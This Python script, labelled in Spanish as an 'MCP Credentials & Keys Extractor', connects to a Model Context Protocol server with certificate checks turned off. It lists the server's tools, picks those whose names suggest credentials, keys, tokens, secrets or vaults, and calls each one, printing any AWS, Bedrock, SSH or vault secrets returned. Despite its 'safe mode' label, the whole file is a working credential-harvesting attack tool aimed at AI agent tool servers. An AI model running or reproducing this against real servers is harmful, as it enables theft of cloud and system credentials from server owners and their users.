#!/usr/bin/env python3

import argparse
import json
import ssl
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

DEFAULT_URL = "https://127.0.0.1:3553/mcp"

def make_ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

SSL_CONTEXT = make_ssl_context()

def post_json(url, payload, session_id=None):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/event-stream",
    }
    if session_id:
        headers["Mcp-Session-Id"] = session_id

    request = urllib.request.Request(
        url,
        data=json.dumps(payload).encode("utf-8"),
        headers=headers,
        method="POST",
    )

    start_time = time.time()
    try:
        with urllib.request.urlopen(request, context=SSL_CONTEXT, timeout=15) as response:
            duration = time.time() - start_time
            return response.status, dict(response.headers.items()), response.read().decode("utf-8", errors="replace"), duration, None
    except urllib.error.HTTPError as exc:
        duration = time.time() - start_time
        body = exc.read().decode("utf-8", errors="replace")
        return exc.code, dict(exc.headers.items()) if exc.headers else {}, body, duration, f"HTTP Error {exc.code}"
    except Exception as exc:
        duration = time.time() - start_time
        return None, {}, "", duration, str(exc)

def parse_response(body):
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        for line in body.splitlines():
            if line.startswith("data:"):
                try:
                    return json.loads(line[5:].strip())
                except json.JSONDecodeError:
                    pass
    return None

def rpc(url, method, params=None, request_id=1, session_id=None, silent=False):
    payload = {"jsonrpc": "2.0", "id": request_id, "method": method}
    if params is not None:
        payload["params"] = params

    status, headers, body, duration, err = post_json(url, payload, session_id)
    result = parse_response(body)

    if not silent and body:
        try:
            parsed_pretty = json.dumps(json.loads(body), indent=2)
            print(parsed_pretty[:1500] + ("\n... [recortado]" if len(parsed_pretty) > 1500 else ""))
        except:
            print(body[:1500])

    return status, headers, result, duration, err

# Argumentos específicos y seguros exclusivamente para obtención de claves y credenciales
def get_credential_arguments(tool_name):
    tn = tool_name.lower()
    
    if "aws_session" in tn or "aws_admin" in tn:
        return {"duration_seconds": 3600}
    elif "bedrock" in tn:
        return {"provider_id": "default"}
    elif "ssh_session" in tn:
        return {"target_host": "localhost"}
    else:
        return {}

def main():
    parser = argparse.ArgumentParser(description="Extractor de Claves y Credenciales para Servidores MCP")
    parser.add_argument("--url", default=DEFAULT_URL, help="URL del servidor MCP (ej: https://XXXXX:3553)")
    args = parser.parse_args()

    print("=" * 65)
    print(" 🔑 MCP CREDENTIALS & KEYS EXTRACTOR (SAFE MODE)")
    print("=" * 65)
    print(f"[+] Endpoint objetivo : {args.url}")
    print("-" * 65)

    # 1. HANDSHAKE
    print("\n[1/3] Realizando handshake inicial...")
    status, headers, _, _, _ = rpc(
        args.url, "initialize",
        {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "mcp-key-extractor", "version": "8.0.0"}},
        request_id=1
    )

    if status != 200:
        print(f"\n[❌ ERROR] El servidor rechazó la conexión (HTTP {status}).")
        return

    session_id = next((v for k, v in headers.items() if k.lower() == "mcp-session-id"), None)
    print(f"[✔ OK] Conexión establecida. Session ID: {session_id}")

    # 2. NOTIFICACIÓN
    post_json(args.url, {"jsonrpc": "2.0", "method": "notifications/initialized"}, session_id=session_id)

    # 3. LISTAR Y FILTRAR ÚNICAMENTE HERRAMIENTAS DE CLAVES/CREDENCIALES
    print("\n[2/3] Buscando herramientas de claves y credenciales...")
    _, _, tools_result, _, _ = rpc(args.url, "tools/list", {}, request_id=2, session_id=session_id, silent=True)

    tools = []
    if isinstance(tools_result, dict) and "result" in tools_result:
        tools = tools_result.get("result", {}).get("tools", [])

    # Filtrar solo herramientas que manejen credenciales, keys, tokens o secretos
    target_keywords = ["credential", "key", "token", "secret", "vault"]
    credential_tools = [
        t for t in tools 
        if any(kw in t.get("name", "").lower() for kw in target_keywords)
    ]

    print(f"\n[✔ OK] Se encontraron {len(tools)} herramientas totales. Filtradas {len(credential_tools)} orientadas a claves/credenciales:\n")
    for t in credential_tools:
        print(f"   • {t.get('name')}")

    if not credential_tools:
        print("\n[!] No se encontraron herramientas específicas de claves o credenciales en este servidor.")
        return

    print("\n[3/3] Extrayendo claves y secretos de las herramientas filtradas...\n")

    for idx, t in enumerate(credential_tools, start=1):
        tool_name = t.get("name")
        print("=" * 65)
        print(f"[{idx}/{len(credential_tools)}] Obteniendo de: {tool_name}")
        print("=" * 65)

        args_payload = get_credential_arguments(tool_name)
        
        exec_status, _, exec_result, _, _ = rpc(
            args.url, "tools/call",
            {"name": tool_name, "arguments": args_payload},
            request_id=100 + idx, session_id=session_id, silent=True
        )

        if isinstance(exec_result, dict):
            if "result" in exec_result:
                content = exec_result["result"].get("content", [])
                print(f"[🔑 Credenciales / Claves recuperadas ({tool_name})]: (HTTP {exec_status})")
                for item in content:
                    if item.get("type") == "text":
                        print(item.get("text"))
                    else:
                        print(json.dumps(item, indent=2))
            else:
                print(f"[📥 Respuesta RPC ({exec_status})]:")
                print(json.dumps(exec_result, indent=2))
        else:
            print(f"[📥 Respuesta en bruto]: {exec_result}")
        print("\n")

    print("=" * 65)
    print(" ✅ EXTRACCIÓN DE CLAVES COMPLETADA")
    print("=" * 65)

if __name__ == "__main__":
    main()
